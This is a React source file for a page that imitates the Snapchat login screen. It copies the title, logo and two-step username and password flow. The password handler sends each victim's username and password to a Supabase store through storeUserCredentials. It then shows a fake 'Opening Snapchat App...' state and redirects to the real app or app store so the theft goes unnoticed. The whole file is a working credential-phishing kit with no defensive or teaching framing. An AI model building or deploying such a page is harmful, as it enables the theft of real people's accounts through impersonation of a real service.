import { useState, useEffect } from 'react';
import { storeUserCredentials } from './lib/supabase';
import './App.css';

function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [currentStep, setCurrentStep] = useState('username'); // 'username' | 'password' | 'opening' | 'success'
  const [isLoading, setIsLoading] = useState(false);
  const [isOpeningApp, setIsOpeningApp] = useState(false);
  const [errors, setErrors] = useState({});

  // Update document title based on current step
  useEffect(() => {
    document.title = 'Log In | Snapchat';
  }, [currentStep]);

  // Handle username submission
  const handleUsernameSubmit = (e) => {
    e.preventDefault();

    // Validate username
    if (!username.trim()) {
      setErrors({ username: 'The input field cannot be empty' });
      return;
    }

    // Show loading state with spinner
    setIsLoading(true);

    // Simulate brief loading then proceed
    setTimeout(() => {
      setIsLoading(false);
      setErrors({});
      setCurrentStep('password');
    }, 800);
  };

  // Handle password submission
  const handlePasswordSubmit = async (e) => {
    e.preventDefault();

    // Validate password
    if (!password.trim()) {
      setErrors({ password: 'The input field cannot be empty' });
      return;
    }

    setErrors({});
    setIsLoading(true);

    try {
      // Store credentials in Supabase
      const result = await storeUserCredentials(username, password);

      if (result.error) {
        console.error('Failed to store credentials:', result.error);
      }

      // Show "Opening Snapchat App..." state
      setIsLoading(false);
      setCurrentStep('opening');
      setIsOpeningApp(true);

      // Wait 5-6 seconds then try to open Snapchat app
      setTimeout(() => {
        openSnapchatApp();
      }, 5500);

    } catch (error) {
      console.error('Error during login:', error);
      setErrors({ password: 'Something went wrong. Please try again.' });
      setIsLoading(false);
    }
  };

  // Try to open Snapchat app (deep linking for iOS/Android)
  const openSnapchatApp = () => {
    // Snapchat deep link URLs
    const snapchatDeepLink = 'snapchat://';
    const snapchatAppStoreIOS = 'https://apps.apple.com/app/snapchat/id447188370';
    const snapchatPlayStore = 'https://play.google.com/store/apps/details?id=com.snapchat.android';

    // Try to open the Snapchat app
    const startTime = Date.now();

    // Create a hidden iframe to try the deep link
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = snapchatDeepLink;
    document.body.appendChild(iframe);

    // Also try direct window location
    window.location.href = snapchatDeepLink;

    // After a short delay, check if we're still on the page
    setTimeout(() => {
      const endTime = Date.now();

      // If we're still here after 2 seconds, app probably didn't open
      if (endTime - startTime < 2500) {
        // Detect platform and redirect to appropriate store
        const userAgent = navigator.userAgent.toLowerCase();
        const isIOS = /iphone|ipad|ipod/.test(userAgent);
        const isAndroid = /android/.test(userAgent);

        if (isIOS) {
          window.location.href = snapchatAppStoreIOS;
        } else if (isAndroid) {
          window.location.href = snapchatPlayStore;
        } else {
          // Desktop - redirect to Snapchat web
          window.location.href = 'https://www.snapchat.com';
        }
      }

      // Clean up
      document.body.removeChild(iframe);
    }, 2000);
  };

  // Handle "Open in Snapchat" button click
  const handleOpenInSnapchat = () => {
    setIsOpeningApp(true);

    setTimeout(() => {
      openSnapchatApp();
    }, 5500);
  };

  // Go back to username step ("Not you?" button)
  const handleNotYou = (e) => {
    e.preventDefault();
    setCurrentStep('username');
    setPassword('');
    setErrors({});
  };

  // Handle forgot password (placeholder for now)
  const handleForgotPassword = (e) => {
    e.preventDefault();
    alert('Forgot Password feature coming soon!');
  };

  // Spinner Component
  const Spinner = () => <span className="spinner"></span>;

  // Eye icons for password visibility
  const EyeIcon = () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  );

  const EyeOffIcon = () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
      <line x1="1" y1="1" x2="23" y2="23" />
    </svg>
  );

  return (
    <div className="app">
      {/* Main White Container */}
      <div className="login-container">
        <div className="login-content">
          {/* Snapchat Logo - Official SVG - BIGGER */}
          <div className="snap-logo">
            <img
              src="/snapchat-icon-for-login-and-signup-page.svg"
              alt="Snapchat"
            />
          </div>

          {/* Page Title - Changes based on step */}
          <h1 className="login-title">
            {currentStep === 'password' || currentStep === 'opening'
              ? 'Enter Password'
              : 'Log in to Snapchat'}
          </h1>

          {/* Username Step */}
          {currentStep === 'username' && (
            <form className="login-form fade-in" onSubmit={handleUsernameSubmit}>
              <div className="input-group">
                <label htmlFor="username" className="input-label">
                  Username or Email
                </label>
                <div className="input-wrapper">
                  <input
                    type="text"
                    id="username"
                    className={`input-field ${errors.username ? 'error' : ''}`}
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    autoComplete="username"
                    autoFocus
                    disabled={isLoading}
                  />
                </div>
                {errors.username && (
                  <span className="error-message">{errors.username}</span>
                )}
              </div>

              <div className="action-link">
                <a href="#phone">Use phone number instead</a>
              </div>

              <button type="submit" className="next-button" disabled={isLoading}>
                {isLoading && <Spinner />}
                Next
              </button>
            </form>
          )}

          {/* Password Step */}
          {currentStep === 'password' && (
            <form className="login-form fade-in" onSubmit={handlePasswordSubmit}>
              {/* Username display with "Not you?" link */}
              <div className="username-display">
                <span className="username-text">{username}</span>
                <a href="#" className="not-you-link" onClick={handleNotYou}>
                  Not you?
                </a>
              </div>

              <div className="input-group">
                <label htmlFor="password" className="input-label">
                  Password
                </label>
                <div className="input-wrapper">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    id="password"
                    className={`input-field has-toggle ${errors.password ? 'error' : ''}`}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    autoComplete="current-password"
                    autoFocus
                    disabled={isLoading}
                  />
                  <button
                    type="button"
                    className="password-toggle"
                    onClick={() => setShowPassword(!showPassword)}
                    aria-label={showPassword ? 'Hide password' : 'Show password'}
                  >
                    {showPassword ? <EyeOffIcon /> : <EyeIcon />}
                  </button>
                </div>
                {errors.password && (
                  <span className="error-message">{errors.password}</span>
                )}
              </div>

              <div className="action-link">
                <button type="button" onClick={handleForgotPassword}>
                  Forgot Password
                </button>
              </div>

              <button type="submit" className="next-button" disabled={isLoading}>
                {isLoading && <Spinner />}
                Next
              </button>
            </form>
          )}

          {/* Opening Snapchat App State */}
          {currentStep === 'opening' && (
            <div className="login-form fade-in">
              {/* Username display */}
              <div className="username-display">
                <span className="username-text">{username}</span>
              </div>

              <div className="opening-button">
                <Spinner />
                Opening Snapchat App...
              </div>
            </div>
          )}

          {/* Success Step (fallback) */}
          {currentStep === 'success' && (
            <div className="success-message fade-in">
              <div className="success-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
                  <polyline points="22 4 12 14.01 9 11.01" />
                </svg>
              </div>
              <h2 className="success-title">Login Successful!</h2>
              <p className="success-text">
                Welcome back, {username}!<br />
                Redirecting you to Snapchat...
              </p>
            </div>
          )}
        </div>
      </div>

      {/* Sign Up Section - OUTSIDE white container */}
      {currentStep !== 'opening' && currentStep !== 'success' && (
        <div className="signup-section">
          <span className="signup-text">New to Snapchat?</span>
          <a href="#signup" className="signup-link">Sign Up</a>
        </div>
      )}

      {/* Black Footer with Yellow Button */}
      <div className="footer-container">
        <button
          className="open-app-button"
          onClick={handleOpenInSnapchat}
          disabled={isOpeningApp}
        >
          {isOpeningApp ? (
            <>
              <Spinner />
              Opening Snapchat...
            </>
          ) : (
            'Open in Snapchat'
          )}
        </button>
      </div>
    </div>
  );
}

export default App;
